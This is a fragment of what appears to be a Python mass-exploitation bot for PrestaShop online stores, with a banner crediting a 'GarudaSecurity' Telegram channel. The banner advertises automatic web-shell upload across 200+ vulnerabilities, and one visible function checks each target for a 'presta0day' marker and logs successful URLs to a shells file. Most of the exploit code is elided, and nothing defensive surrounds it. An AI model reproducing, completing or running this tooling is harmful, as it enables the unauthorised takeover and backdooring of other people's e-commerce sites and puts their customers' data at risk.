...
#                                     #
#         PrestaShop Exploits         #
#  Crack & Clean By : GarudaSecurity    #
#     https://t.me/garudasec4        #
#######################################
...
def blocktestimonial(url):
	try:
		...
		if "presta0day" in kontrol.text:
			...
			with open("result/shells.txt","a") as f:
				f.write(kontrolurl + "\n")
		else:
...
tools Channel : https://t.me/garudasec4
result save with script/result 
======================================================
 
[""" + spe.r + "#" + spe.g + """] presta0day Priv8 Bot 200+ Vuln
[""" + spe.r + "#" + spe.g + """] PrestaShop Auto Shell Upload Bot
[""" + spe.r + "#" + spe.g + """] Cracked And Cleaned By GarudaSecurity """)
